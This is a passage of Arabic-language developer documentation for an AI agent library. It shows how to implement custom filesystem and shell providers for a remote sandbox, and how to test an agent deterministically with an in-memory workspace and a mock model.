الواجهتان صغيرتان. المسارات نسبية للـworkspace وتستخدم `/`. `normalizeWorkspacePath()` يطبّق نفس الفحوص اللي تستخدمها الـproviders المدمجة. الـprovider المكشوف لـmodel لازم يحصر المسارات بنفسه، لأن أداة مخصصة ممكن تناديه مباشرة. عند الفشل ارمِ `WorkspaceError` برسالة مفهومة.

```ts
import { normalizeWorkspacePath, WorkspaceError, type FsProvider, type ShellProvider } from '@lousho/build-ai-agent';

// A stand-in for your remote sandbox SDK (E2B, Daytona, Cloudflare, ...).
declare const remote: {
  read(path: string): Promise<string | null>;
  write(path: string, data: string): Promise<void>;
  list(path: string): Promise<{ name: string; dir: boolean }[]>;
  run(cmd: string, opts: { cwd: string; timeoutMs?: number }): Promise<{ out: string; err: string; code: number }>;
};
const base = '/home/user/project';
const abs = (path: string) => `${base}/${normalizeWorkspacePath(path, 'posix')}`;

export const remoteFs: FsProvider = {
  async readFile(path) {
    const data = await remote.read(abs(path));
    if (data === null) throw new WorkspaceError(`File not found: ${path}`);
    return data;
  },
  writeFile: (path, content) => remote.write(abs(path), content),
  async stat(path) {
    const data = await remote.read(abs(path));
    return data === null ? undefined : { type: 'file', size: data.length };
  },
  async readdir(path) {
    return (await remote.list(abs(path))).map((e) => ({ name: e.name, type: e.dir ? 'directory' : 'file' }));
  },
  async mkdir(path) { await remote.run(`mkdir -p '${abs(path)}'`, { cwd: base }); },
  async rm(path, options) { await remote.run(`rm ${options?.recursive ? '-r ' : ''}'${abs(path)}'`, { cwd: base }); },
};

export const remoteShell: ShellProvider = {
  async exec(command, options = {}) {
    const r = await remote.run(command, { cwd: abs(options.cwd ?? '.'), timeoutMs: options.timeoutMs });
    return { stdout: r.out, stderr: r.err, exitCode: r.code, timedOut: false };
  },
};
```

فيه دالتان اختياريتان، `getMode(path)` و`chmod(path, mode)`، تخلي `WorkspaceCheckpoints` يستعيد بتات صلاحيات الملف مع محتواه؛ بدونها الـrewind يرجّع المحتوى فقط.

`ShellProvider.exec` لازم ترجّع نتيجة (resolve) مو ترفض (reject) عند exit code غير صفري، أو timeout (`timedOut: true`)، أو إلغاء (`aborted: true`). ولا ترفض إلا إذا تعذّر بدء الأمر أصلًا.

## الاختبار بـ`MemoryWorkspace`

`MemoryWorkspace` يحتفظ بشجرة الملفات في الذاكرة ويفحص المسارات بنفس الطريقة. `exec` فيه stub تبرمجه إنت، وكل أمر يستلمه يُسجَّل. ادمجه مع `mockModel` لاختبارات deterministic:

```ts
import { createAgent, createFsTools, createShellTool, MemoryWorkspace } from '@lousho/build-ai-agent';
import { mockModel } from '@lousho/build-ai-agent/testing';

const workspace = new MemoryWorkspace({
  files: { 'src/math.ts': 'export const add = (a: number, b: number) => a - b;\n' },
  exec: (command) => (command === 'npm test' ? { stdout: '1 passed\n' } : { exitCode: 1, stderr: 'unknown command\n' }),
});
const provider = mockModel([
  { toolCalls: [{ name: 'edit_file', args: { path: 'src/math.ts', old_string: 'a - b', new_string: 'a + b' } }] },
  { toolCalls: [{ name: 'shell', args: { command: 'npm test' } }] },
  'Fixed add() and the tests pass.',
]);
const agent = createAgent({
  instructions: 'Fix bugs.',
  provider,
  tools: [...createFsTools(workspace), createShellTool(workspace, { needsApproval: false })],
});
await agent.send('add() is broken');
console.log(workspace.snapshot()['src/math.ts']); // '... a + b;\n'
console.log(workspace.commands.map((c) => c.command)); // ['npm test']
```
